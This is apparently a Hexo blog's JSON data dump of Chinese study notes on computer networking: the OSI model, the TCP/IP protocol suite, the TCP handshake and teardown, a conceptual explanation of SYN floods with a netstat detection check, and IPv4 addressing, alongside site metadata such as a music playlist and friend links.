title=\"网络层\"></a>网络层</h3><p><strong>IP协议</strong></p>\n<p>网络层引入了IP协议，制定了一套新地址，使得我们能够区分两台主机是否同属一个网络，这套地址就是网络地址，也就是所谓的IP地址。IP协议将这个32位的地址分为两部分，前面部分代表网络地址，后面部分表示该主机在局域网中的地址。如果两个IP地址在同一个子网内，则网络地址一定相同。为了判断IP地址中的网络地址，IP协议还引入了子网掩码，IP地址和子网掩码通过按位与运算后就可以得到网络地址。 [4] </p>\n<p><strong>ARP协议</strong></p>\n<p>即地址解析协议，是根据IP地址获取MAC地址的一个网络层协议。其工作原理如下：ARP首先会发起一个请求数据包，数据包的首部包含了目标主机的IP地址，然后这个数据包会在链路层进行再次包装，生成以太网数据包，最终由以太网广播给子网内的所有主机，每一台主机都会接收到这个数据包，并取出标头里的IP地址，然后和自己的IP地址进行比较，如果相同就返回自己的MAC地址，如果不同就丢弃该数据包。ARP接收返回消息，以此确定目标机的MAC地址；与此同时，ARP还会将返回的MAC地址与对应的IP地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。 [4] </p>\n<p><strong>路由协议</strong></p>\n<p>首先通过IP协议来判断两台主机是否在同一个<a href=\"https://baike.baidu.com/item/子网/1186929\" target=\"_blank\" rel=\"noopener\">子网</a>中，如果在同一个子网，就通过ARP协议查询对应的MAC地址，然后以广播的形式向该子网内的主机发送数据包；如果不在同一个子网，以太网会将该数据包转发给本子网的网关进行路由。<a href=\"https://baike.baidu.com/item/网关/98992\" target=\"_blank\" rel=\"noopener\">网关</a>是<a href=\"https://baike.baidu.com/item/互联网/199186\" target=\"_blank\" rel=\"noopener\">互联网</a>上子网与子网之间的桥梁，所以网关会进行多次转发，最终将该数据包转发到目标IP所在的子网中，然后再通过ARP获取目标机MAC，最终也是通过广播形式将数据包发送给接收方。而完成这个路由协议的物理设备就是<a href=\"https://baike.baidu.com/item/路由器/108294\" target=\"_blank\" rel=\"noopener\">路由器</a>，路由器扮演着交通枢纽的角色，它会根据信道情况，选择并设定路由，以最佳路径来转发数据包。 [4] </p>\n<p>所以，网络层的主要工作是定义网络地址、区分网段、子网内MAC寻址、对于不同子网的数据包进行路由。 [4] </p>\n<h3 id=\"传输层\"><a href=\"#传输层\" class=\"headerlink\" title=\"传输层\"></a>传输层</h3><p>链路层定义了主机的身份，即MAC地址，而网络层定义了IP地址，明确了主机所在的<a href=\"https://baike.baidu.com/item/网段/11026985\" target=\"_blank\" rel=\"noopener\">网段</a>，有了这两个地址，数据包就从可以从一个主机发送到另一台主机。但实际上数据包是从一个主机的某个应用程序发出，然后由对方主机的应用程序接收。而每台电脑都有可能同时运行着很多个应用程序，所以当数据包被发送到主机上以后，是无法确定哪个应用程序要接收这个包。因此传输层引入了<a href=\"https://baike.baidu.com/item/UDP/571511\" target=\"_blank\" rel=\"noopener\">UDP</a>协议来解决这个问题，为了给每个应用程序标识身份。</p>\n<p>传输层协议负责解决数据传输问题，包括数据通行的可靠性问题。传输层依赖更底层的网络层来完成实际的数据传输，在TCP/IP网络协议中，负责可靠通信的传输层协议为TCP协议。<strong>而网络层一般用网络驱动来实现，普通的程序员不会涉及</strong>；在TCP/IP协议中，网络层的协议为IP协议。</p>\n<p><strong>UDP协议</strong></p>\n<p>UDP协议定义了端口，同一个主机上的每个应用程序都需要指定唯一的端口号，并且规定网络中传输的数据包必须加上端口信息，当数据包到达主机以后，就可以根据端口号找到对应的应用程序了。UDP协议比较简单，实现容易，但它没有确认机制，数据包一旦发出，无法知道对方是否收到，因此可靠性较差，为了解决这个问题，提高网络可靠性，TCP协议就诞生了。</p>\n<p><strong>TCP协议</strong></p>\n<p>TCP即传输控制协议，是一种面向连接的、可靠的、基于字节流的通信协议。简单来说TCP就是有确认机制的UDP协议，每发出一个数据包都要求确认，如果有一个数据包丢失，就收不到确认，发送方就必须重发这个数据包。为了保证传输的可靠性，TCP协议在UDP基础之上建立了三次对话的确认机制，即在正式收发数据前，必须和对方建立可靠的连接。TCP数据包和UDP一样，都是由首部和数据两部分组成，唯一不同的是，TCP数据包没有长度限制，理论上可以无限长，但是为了保证网络的效率，通常TCP数据包的长度不会超过IP数据包的长度，以确保单个TCP数据包不必再分割。 [4] </p>\n<p>传输层的主要工作是定义<a href=\"https://baike.baidu.com/item/端口/103505\" target=\"_blank\" rel=\"noopener\">端口</a>，标识应用程序身份，实现端口到端口的通信，TCP协议可以保证数据传输的可靠性。 [4] </p>\n<h3 id=\"应用层\"><a href=\"#应用层\" class=\"headerlink\" title=\"应用层\"></a>应用层</h3><p>理论上讲，有了以上三层协议的支持，数据已经可以从一个主机上的应用程序传输到另一台主机的应用程序了，但此时传过来的数据是字节流，不能很好的被程序识别，操作性差，因此，应用层定义了各种各样的协议来规范数据格式，常见的有<a href=\"https://baike.baidu.com/item/http/243074\" target=\"_blank\" rel=\"noopener\">http</a>,ftp,<a href=\"https://baike.baidu.com/item/smtp/175887\" target=\"_blank\" rel=\"noopener\">smtp</a>等，在请求<a href=\"https://baike.baidu.com/item/Header/688992\" target=\"_blank\" rel=\"noopener\">Header</a>中，分别定义了请求数据格式Accept和响应数据格式Content-Type，有了这个规范以后，当对方接收到请求以后就知道该用什么格式来解析，然后对请求进行处理，最后按照请求方要求的格式将数据返回，请求端接收到响应后，就按照规定的格式进行解读。 [4] </p>\n<p>所以应用层的主要工作就是定义数据格式并按照对应的格式解读数据。 [4] </p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"现阶段计算机网络知识笔记以及整合\"><a href=\"#现阶段计算机网络知识笔记以及整合\" class=\"headerlink\" title=\"现阶段计算机网络知识笔记以及整合\"></a>现阶段计算机网络知识笔记以及整合</h1><h2 id=\"OSI网络参考模型\"><a href=\"#OSI网络参考模型\" class=\"headerlink\" title=\"OSI网络参考模型\"></a>OSI网络参考模型</h2><p><strong>开放式系统互联模型</strong>（英语：<strong>O</strong>pen <strong>S</strong>ystem <strong>I</strong>nterconnection Model，缩写：OSI；简称为<strong>OSI模型</strong>）是一种<a href=\"https://zh.wikipedia.org/wiki/概念模型\" target=\"_blank\" rel=\"noopener\">概念模型</a>，由<a href=\"https://zh.wikipedia.org/wiki/国际标准化组织\" target=\"_blank\" rel=\"noopener\">国际标准化组织</a>提出，一个试图使各种计算机在世界范围内互连为网络的标准框架。定义于ISO/IEC 7498-1。</p>\n<p>根据建议X.200，OSI将计算机网络体系结构划分为以下七层，标有1～7，第1层在底部。 现“OSI/RM”是<a href=\"https://zh.wikipedia.org/wiki/英文\" target=\"_blank\" rel=\"noopener\">英文</a>“Open Systems Interconnection Reference Model”的缩写。</p>\n<p>PS:这只是一种参考模型</p>\n<h3 id=\"第7层-应用层\"><a href=\"#第7层-应用层\" class=\"headerlink\" title=\"第7层 应用层\"></a>第7层 应用层</h3><p>主条目：<a href=\"https://zh.wikipedia.org/wiki/应用层\" target=\"_blank\" rel=\"noopener\">应用层</a></p>\n<p>应用层（Application Layer）提供为应用软件而设计的接口，以设置与另一应用软件之间的通信。例如：HTTP、HTTPS、FTP、Telnet、SSH、SMTP、POP3等。</p>\n<h3 id=\"第6层-表示层\"><a href=\"#第6层-表示层\" class=\"headerlink\" title=\"第6层 表示层\"></a>第6层 表示层</h3><p>主条目：<a href=\"https://zh.wikipedia.org/wiki/表示层\" target=\"_blank\" rel=\"noopener\">表示层</a></p>\n<p>表示层（Presentation Layer）把数据转换为能与接收者的系统格式兼容并适合传输的格式。</p>\n<h3 id=\"第5层-会话层\"><a href=\"#第5层-会话层\" class=\"headerlink\" title=\"第5层 会话层\"></a>第5层 会话层</h3><p>主条目：<a href=\"https://zh.wikipedia.org/wiki/会话层\" target=\"_blank\" rel=\"noopener\">会话层</a></p>\n<p>会话层（Session Layer）负责在数据传输中设置和维护计算机网络中两台计算机之间的通信连接。</p>\n<h3 id=\"第4层-传输层\"><a href=\"#第4层-传输层\" class=\"headerlink\" title=\"第4层 传输层\"></a>第4层 传输层</h3><p>主条目：<a href=\"https://zh.wikipedia.org/wiki/传输层\" target=\"_blank\" rel=\"noopener\">传输层</a></p>\n<p>传输层（Transport Layer）把传输表头（TH）加至数据以形成数据包。传输表头包含了所使用的协议等发送信息。例如:传输控制协议（TCP）等。</p>\n<h3 id=\"第3层-网络层\"><a href=\"#第3层-网络层\" class=\"headerlink\" title=\"第3层 网络层\"></a>第3层 网络层</h3><p>主条目：<a href=\"https://zh.wikipedia.org/wiki/网络层\" target=\"_blank\" rel=\"noopener\">网络层</a></p>\n<p>网络层（Network Layer）决定数据的路径选择和转寄，将网络表头（NH）加至数据包，以形成报文。网络表头包含了网络资料。例如:互联网协议（IP）等。</p>\n<h3 id=\"第2层-数据链路层\"><a href=\"#第2层-数据链路层\" class=\"headerlink\" title=\"第2层 数据链路层\"></a>第2层 数据链路层</h3><p>主条目：<a href=\"https://zh.wikipedia.org/wiki/数据链路层\" target=\"_blank\" rel=\"noopener\">数据链路层</a></p>\n<p>数据链路层（Data Link Layer）负责网络寻址、错误侦测和改错。当表头和表尾被加至数据包时，会形成<a href=\"https://zh.wikipedia.org/wiki/資訊框\" target=\"_blank\" rel=\"noopener\">信息框</a>（Data Frame）。数据链表头（DLH）是包含了物理地址和错误侦测及改错的方法。数据链表尾（DLT）是一串指示数据包末端的字符串。例如以太网、无线局域网（Wi-Fi）和通用分组无线服务（GPRS）等。</p>\n<p>分为两个子层：逻辑链路控制（logical link control，LLC）子层和介质访问控制（Media access control，MAC）子层。</p>\n<h3 id=\"第1层-物理层\"><a href=\"#第1层-物理层\" class=\"headerlink\" title=\"第1层 物理层\"></a>第1层 物理层</h3><p>主条目：<a href=\"https://zh.wikipedia.org/wiki/物理层\" target=\"_blank\" rel=\"noopener\">物理层</a></p>\n<p>物理层（Physical Layer）在局部局域网上传送<a href=\"https://zh.wikipedia.org/wiki/数据帧\" target=\"_blank\" rel=\"noopener\">数据帧</a>（Data Frame），它负责管理电脑通信设备和网络媒体之间的互通。包括了针脚、电压、线缆规范、集线器、中继器、网卡、主机接口卡等。</p>\n<h2 id=\"TCP-IP协议族\"><a href=\"#TCP-IP协议族\" class=\"headerlink\" title=\"TCP/IP协议族\"></a>TCP/IP协议族</h2><p>TCP/IP 是基于 TCP 和 IP 这两个最初的协议之上的不同的通信协议的大集合。</p>\n<p>里面有：</p>\n<h4 id=\"TCP-传输控制协议\"><a href=\"#TCP-传输控制协议\" class=\"headerlink\" title=\"TCP - 传输控制协议\"></a>TCP - 传输控制协议</h4><p>TCP 用于从应用程序到网络的数据传输控制。</p>\n<p>TCP 负责在数据传送之前将它们分割为 IP 包，然后在它们到达的时候将它们重组。</p>\n<hr>\n<h4 id=\"IP-网际协议（Internet-Protocol）\"><a href=\"#IP-网际协议（Internet-Protocol）\" class=\"headerlink\" title=\"IP - 网际协议（Internet Protocol）\"></a>IP - 网际协议（Internet Protocol）</h4><p>IP 负责计算机之间的通信。</p>\n<p>IP 负责在因特网上发送和接收数据包。</p>\n<hr>\n<h4 id=\"HTTP-超文本传输协议-Hyper-Text-Transfer-Protocol\"><a href=\"#HTTP-超文本传输协议-Hyper-Text-Transfer-Protocol\" class=\"headerlink\" title=\"HTTP - 超文本传输协议(Hyper Text Transfer Protocol)\"></a>HTTP - 超文本传输协议(Hyper Text Transfer Protocol)</h4><p>HTTP 负责 web 服务器与 web 浏览器之间的通信。</p>\n<p>HTTP 用于从 web 客户端（浏览器）向 web 服务器发送请求，并从 web 服务器向 web 客户端返回内容（网页）。</p>\n<hr>\n<h4 id=\"HTTPS-安全的-HTTP（HTTP-Secure）\"><a href=\"#HTTPS-安全的-HTTP（HTTP-Secure）\" class=\"headerlink\" title=\"HTTPS - 安全的 HTTP（HTTP Secure）\"></a>HTTPS - 安全的 HTTP（HTTP Secure）</h4><p>HTTPS 负责在 web 服务器和 web 浏览器之间的安全通信。</p>\n<p>作为有代表性的应用，HTTPS 会用于处理信用卡交易和其他的敏感数据。</p>\n<hr>\n<h4 id=\"SSL-安全套接字层（Secure-Sockets-Layer）\"><a href=\"#SSL-安全套接字层（Secure-Sockets-Layer）\" class=\"headerlink\" title=\"SSL - 安全套接字层（Secure Sockets Layer）\"></a>SSL - 安全套接字层（Secure Sockets Layer）</h4><p>SSL 协议用于为安全数据传输加密数据。（TLS协议的前身）</p>\n<hr>\n<h4 id=\"TLS-安全传输层协议（Transport-Layer-Security）\"><a href=\"#TLS-安全传输层协议（Transport-Layer-Security）\" class=\"headerlink\" title=\"TLS - 安全传输层协议（Transport Layer Security）\"></a>TLS - 安全传输层协议（Transport Layer Security）</h4><p>TLS协议用于在两个通信应用程序之间提供保密性和数据完整性。（标准化SSL协议）</p>\n<hr>\n<h4 id=\"SMTP-简易邮件传输协议（Simple-Mail-Transfer-Protocol）\"><a href=\"#SMTP-简易邮件传输协议（Simple-Mail-Transfer-Protocol）\" class=\"headerlink\" title=\"SMTP - 简易邮件传输协议（Simple Mail Transfer Protocol）\"></a>SMTP - 简易邮件传输协议（Simple Mail Transfer Protocol）</h4><p>SMTP 用于电子邮件的传输。</p>\n<hr>\n<h4 id=\"MIME-多用途因特网邮件扩展（Multi-purpose-Internet-Mail-Extensions）\"><a href=\"#MIME-多用途因特网邮件扩展（Multi-purpose-Internet-Mail-Extensions）\" class=\"headerlink\" title=\"MIME - 多用途因特网邮件扩展（Multi-purpose Internet Mail Extensions）\"></a>MIME - 多用途因特网邮件扩展（Multi-purpose Internet Mail Extensions）</h4><p>MIME 协议使 SMTP 有能力通过 TCP/IP 网络传输多媒体文件，包括声音、视频和二进制数据。</p>\n<hr>\n<h4 id=\"IMAP-因特网消息访问协议（Internet-Message-Access-Protocol）\"><a href=\"#IMAP-因特网消息访问协议（Internet-Message-Access-Protocol）\" class=\"headerlink\" title=\"IMAP - 因特网消息访问协议（Internet Message Access Protocol）\"></a>IMAP - 因特网消息访问协议（Internet Message Access Protocol）</h4><p>IMAP 用于存储和取回电子邮件。</p>\n<hr>\n<h4 id=\"POP-邮局协议（Post-Office-Protocol）\"><a href=\"#POP-邮局协议（Post-Office-Protocol）\" class=\"headerlink\" title=\"POP - 邮局协议（Post Office Protocol）\"></a>POP - 邮局协议（Post Office Protocol）</h4><p>POP 用于从电子邮件服务器向个人电脑下载电子邮件。</p>\n<hr>\n<h4 id=\"FTP-文件传输协议（File-Transfer-Protocol）\"><a href=\"#FTP-文件传输协议（File-Transfer-Protocol）\" class=\"headerlink\" title=\"FTP - 文件传输协议（File Transfer Protocol）\"></a>FTP - 文件传输协议（File Transfer Protocol）</h4><p>FTP 负责计算机之间的文件传输。</p>\n<hr>\n<h4 id=\"NTP-网络时间协议（Network-Time-Protocol）\"><a href=\"#NTP-网络时间协议（Network-Time-Protocol）\" class=\"headerlink\" title=\"NTP - 网络时间协议（Network Time Protocol）\"></a>NTP - 网络时间协议（Network Time Protocol）</h4><p>NTP 用于在计算机之间同步时间（钟）。</p>\n<hr>\n<h4 id=\"DHCP-动态主机配置协议（Dynamic-Host-Configuration-Protocol）\"><a href=\"#DHCP-动态主机配置协议（Dynamic-Host-Configuration-Protocol）\" class=\"headerlink\" title=\"DHCP - 动态主机配置协议（Dynamic Host Configuration Protocol）\"></a>DHCP - 动态主机配置协议（Dynamic Host Configuration Protocol）</h4><p>DHCP 用于向网络中的计算机分配动态 IP 地址。</p>\n<hr>\n<h4 id=\"SNMP-简单网络管理协议（Simple-Network-Management-Protocol）\"><a href=\"#SNMP-简单网络管理协议（Simple-Network-Management-Protocol）\" class=\"headerlink\" title=\"SNMP - 简单网络管理协议（Simple Network Management Protocol）\"></a>SNMP - 简单网络管理协议（Simple Network Management Protocol）</h4><p>SNMP 用于计算机网络的管理。</p>\n<hr>\n<h4 id=\"LDAP-轻量级的目录访问协议（Lightweight-Directory-Access-Protocol）\"><a href=\"#LDAP-轻量级的目录访问协议（Lightweight-Directory-Access-Protocol）\" class=\"headerlink\" title=\"LDAP - 轻量级的目录访问协议（Lightweight Directory Access Protocol）\"></a>LDAP - 轻量级的目录访问协议（Lightweight Directory Access Protocol）</h4><p>LDAP 用于从因特网搜集关于用户和电子邮件地址的信息。</p>\n<hr>\n<h4 id=\"ICMP-因特网消息控制协议（Internet-Control-Message-Protocol）\"><a href=\"#ICMP-因特网消息控制协议（Internet-Control-Message-Protocol）\" class=\"headerlink\" title=\"ICMP - 因特网消息控制协议（Internet Control Message Protocol）\"></a>ICMP - 因特网消息控制协议（Internet Control Message Protocol）</h4><p>ICMP 负责网络中的错误处理。</p>\n<hr>\n<h4 id=\"ARP-地址解析协议（Address-Resolution-Protocol）\"><a href=\"#ARP-地址解析协议（Address-Resolution-Protocol）\" class=\"headerlink\" title=\"ARP - 地址解析协议（Address Resolution Protocol）\"></a>ARP - 地址解析协议（Address Resolution Protocol）</h4><p>ARP - 用于通过 IP 来查找基于 IP 地址的计算机网卡的硬件地址。</p>\n<hr>\n<h4 id=\"RARP-反向地址转换协议（Reverse-Address-Resolution-Protocol）\"><a href=\"#RARP-反向地址转换协议（Reverse-Address-Resolution-Protocol）\" class=\"headerlink\" title=\"RARP - 反向地址转换协议（Reverse Address Resolution Protocol）\"></a>RARP - 反向地址转换协议（Reverse Address Resolution Protocol）</h4><p>RARP 用于通过 IP 查找基于硬件地址的计算机网卡的 IP 地址。</p>\n<hr>\n<h4 id=\"BOOTP-自举协议（Boot-Protocol）\"><a href=\"#BOOTP-自举协议（Boot-Protocol）\" class=\"headerlink\" title=\"BOOTP - 自举协议（Boot Protocol）\"></a>BOOTP - 自举协议（Boot Protocol）</h4><p>BOOTP 用于从网络启动计算机。</p>\n<hr>\n<h4 id=\"PPTP-点对点隧道协议（Point-to-Point-Tunneling-Protocol）\"><a href=\"#PPTP-点对点隧道协议（Point-to-Point-Tunneling-Protocol）\" class=\"headerlink\" title=\"PPTP - 点对点隧道协议（Point to Point Tunneling Protocol）\"></a>PPTP - 点对点隧道协议（Point to Point Tunneling Protocol）</h4><p>PPTP 用于私人网络之间的连接（隧道）。</p>\n<h2 id=\"TCP-IP\"><a href=\"#TCP-IP\" class=\"headerlink\" title=\"TCP/IP\"></a>TCP/IP</h2><p>TCP/IP 是用于因特网 (Internet) 的通信协议。</p>\n<p>TCP/IP 是供已连接因特网的计算机进行通信的通信协议。</p>\n<p>TCP/IP 指传输控制协议/网际协议（<em>T</em>ransmission <em>C</em>ontrol <em>P</em>rotocol / <em>I</em>nternet <em>P</em>rotocol）。</p>\n<p>TCP/IP 定义了电子设备（比如计算机）如何连入因特网，以及数据如何在它们之间传输的标准。</p>\n<h3 id=\"TCP-使用固定的连接\"><a href=\"#TCP-使用固定的连接\" class=\"headerlink\" title=\"TCP 使用固定的连接\"></a>TCP 使用固定的连接</h3><p>TCP 用于应用程序之间的通信。</p>\n<p>当应用程序希望通过 TCP 与另一个应用程序通信时，它会发送一个通信请求。这个请求必须被送到一个确切的地址。在双方”握手”之后，TCP 将在两个应用程序之间建立一个全双工 (full-duplex) 的通信。</p>\n<p>这个全双工的通信将占用两个计算机之间的通信线路，直到它被一方或双方关闭为止。</p>\n<p>UDP 和 TCP 很相似，但是更简单，同时可靠性低于 TCP。</p>\n<h3 id=\"IP-是无连接的\"><a href=\"#IP-是无连接的\" class=\"headerlink\" title=\"IP 是无连接的\"></a>IP 是无连接的</h3><p>IP 用于计算机之间的通信。</p>\n<p>IP 是无连接的通信协议。它不会占用两个正在通信的计算机之间的通信线路。这样，IP 就降低了对网络线路的需求。每条线可以同时满足许多不同的计算机之间的通信需要。</p>\n<p>通过 IP，消息（或者其他数据）被分割为小的独立的包，并通过因特网在计算机之间传送。</p>\n<p>IP 负责将每个包路由至它的目的地。</p>\n<h3 id=\"TCP-IP协同而分工工作\"><a href=\"#TCP-IP协同而分工工作\" class=\"headerlink\" title=\"TCP/IP协同而分工工作\"></a><strong>TCP/IP协同而分工工作</strong></h3><p>TCP/IP 意味着 TCP 和 IP 在一起协同工作。但他们分工又十分分明，简单来说：</p>\n<p>TCP 负责应用软件（比如浏览器）和网络软件之间的通信。</p>\n<p>IP 负责计算机之间的通信。</p>\n<p>TCP 负责将数据分割并装入 IP 包，然后在它们到达的时候重新组合它们。</p>\n<p>IP 负责将包发送至接受者。</p>\n<h4 id=\"TCP三次握手、四次挥手\"><a href=\"#TCP三次握手、四次挥手\" class=\"headerlink\" title=\"TCP三次握手、四次挥手\"></a>TCP三次握手、四次挥手</h4><hr>\n<ul>\n<li>所谓<strong>三次握手</strong>(Three-way Handshake)，是指建立一个TCP连接时，需要客户端和服务器总共发送3个数据包。</li>\n</ul>\n<p>三次握手的目的是连接服务器指定端口，建立TCP连接,并同步连接双方的序列号和确认号并交换 TCP 窗口大小信息。<br><strong>第一次握手：</strong>Client向Server发送SYN握手包（seq=x），进入SYN_SEND状态<br><strong>第二次握手：</strong>Server返回SYN+ACK确认包(seq=y,ack=x+1)，进入SYN_RECV状态<br><strong>第三次握手：</strong>Client再次发送ACK确认包(ack=y+1),此包发送完毕，客户端A和服务器B进入ESTABLISHED状态，完成三次握手。</p>\n<p>完成三次握手，客户端与服务器开始传送数据。</p>\n<h4 id=\"图文详解：\"><a href=\"#图文详解：\" class=\"headerlink\" title=\"图文详解：\"></a>图文详解：</h4><p><img src=\"http://www.centos.bz/wp-content/uploads/2012/08/100327002629.png\" alt=\"100327002629\"><br> 第一次握手:<br> 客户端发送一个TCP的<strong>SYN标志位置为1</strong>的包（表明这是一个<strong>SYN包</strong>）指明客户打算连接的服务器的端口，以及<strong>初始序号X</strong>,保存在包头的序列号(<strong>Seq</strong>uence Number)字段里。<br><img src=\"http://www.centos.bz/wp-content/uploads/2012/08/100327002911.png\" alt=\"100327002911\"><br> 第二次握手:<br> 服务器发回<strong>SYN+ACK确认包</strong>应答。即<strong>SYN标志位和ACK标志位均为1</strong>同时，将确认序号(<strong>Ack</strong>nowledgement Number)设置为客户的初始序号加1，即X+1。并设置这个SYN+ACK确认包的序列号（seq）为<strong>Y</strong><br><img src=\"http://www.centos.bz/wp-content/uploads/2012/08/100327003054.png\" alt=\"100327003054\"></p>\n<p>第三次握手.<br> 客户端发送一个<strong>ACK确认包</strong>（ <strong>SYN标志位为0,ACK标志位为1</strong>）。并且把服务器发来SYN+ACK确认包的序列号（seq）字段+1,放在确认序号字段中发送给对方。<br><img src=\"http://www.centos.bz/wp-content/uploads/2012/08/100327003214.png\" alt=\"100327003214\"></p>\n<p>上面这个来回对对方发来的数据包的序列号seq的值+1再作为确认序号发送回去的过程，可以在一定程度上保证信息传递的完整性以及安全。</p>\n<p><strong>SYN攻击</strong><br>   在三次握手过程中，服务器发送SYN-ACK之后，收到客户端的ACK之前的TCP连接称为半连接(half-open connect).此时服务器处于Syn_RECV状态.当收到ACK后，服务器转入ESTABLISHED状态.<br>  Syn攻击就是 攻击客户端  在短时间内伪造大量不存在的IP地址，向服务器不断地发送syn包，服务器回复确认包，并等待客户的确认，由于源地址是不存在的，服务器需要不断的重发直 至超时，这些伪造的SYN包将长时间占用未连接队列，正常的SYN请求被丢弃，目标系统运行缓慢，严重者引起网络堵塞甚至系统瘫痪。<br> Syn攻击是一个典型的<a href=\"https://www.centos.bz/tag/ddos/\" target=\"_blank\" rel=\"noopener\">DDOS</a>攻击。检测SYN攻击非常的方便，当你在服务器上看到大量的半连接状态时，特别是源IP地址是随机的，基本上可以断定这是一次SYN攻击.在<a href=\"http://www.centos.bz/\" target=\"_blank\" rel=\"noopener\">Linux</a>下可以如下命令检测是否被Syn攻击</p>\n<pre><code class=\"shell\">netstat -n -p TCP | grep SYN_RECV</code></pre>\n<p> 一般较新的TCP/IP协议栈都对这一过程进行修正来防范Syn攻击，修改TCP协议实现。主要方法有SynAttackProtect保护机制、SYN cookies技术、增加最大半连接和缩短超时时间等.<br> 但是不能完全防范SYN攻击。</p>\n<ul>\n<li>所谓<strong>四次挥手</strong>(four-way handshake)，是指拆除一个TCP连接时，需要客户端和服务器总共发送4个数据包。</li>\n</ul>\n<p>与上面写的三次握手不同的是，客户端或服务器均可主动发起挥手动作。</p>\n<p><strong>第一次挥手：</strong>主动方发送一个FIN，用来关闭主动方到被动方的数据传送</p>\n<p><strong>第二次挥手：</strong>被动方收到这个FIN，它发回一个ACK，确认序号为收到的序号加1</p>\n<p>这中间如果被动方还有数据没有发送完毕，可以继续发送，直到完成后，再接着进行第三次挥手（<strong>这也是为什么握手只要三次，挥手却需要四次</strong>）</p>\n<p><strong>第三次挥手：</strong>被动方关闭与主动方的连接，发送一个FIN给主动方</p>\n<p><strong>第四次挥手：</strong>主动方发回ACK报文确认，并将确认序号设置为收到序号加1</p>\n<p><img src=\"http://www.centos.bz/wp-content/uploads/2012/08/100327022731.jpg\" alt=\"100327022731\"></p>\n<p> 一般较新的TCP/IP协议栈都对这一过程进行修正来防范Syn攻击，修改tcp协议实现。主要方法有SynAttackProtect保护机制、SYN cookies技术、增加最大半连接和缩短超时时间等.<br> 但是不能完全防范syn攻击。</p>\n<p>上图有疏漏，最后一个ACK包中的ACK应当等于Y+1。</p>\n<h2 id=\"IP地址（IPv4）\"><a href=\"#IP地址（IPv4）\" class=\"headerlink\" title=\"IP地址（IPv4）\"></a>IP地址（IPv4）</h2><p>每个计算机必须有一个 IP 地址才能够连入因特网。</p>\n<p>每个 IP 包必须有一个地址才能够发送到另一台计算机。</p>\n<p>TCP/IP 使用 4 组数字（4个数字）来为计算机编址。每个计算机必须有一个唯一的 4 组数字的地址（IPv4地址）。</p>\n<p>每组数字必须在 0 到 255（就是8位二进制数） 之间，并由点号隔开，比如：192.168.1.60。</p>\n<p>所以一个ip地址实际上一个32位的二进制数，每八位用一个点号分开。</p>\n<h3 id=\"IPv6\"><a href=\"#IPv6\" class=\"headerlink\" title=\"IPv6\"></a>IPv6</h3><p>下一代ip协议，为了应对IPv4地址日渐消耗殆尽的问题而设计的。暂且不表，因为我还没仔细了解</p>\n<h2 id=\"TCP-IP协议四层模型\"><a href=\"#TCP-IP协议四层模型\" class=\"headerlink\" 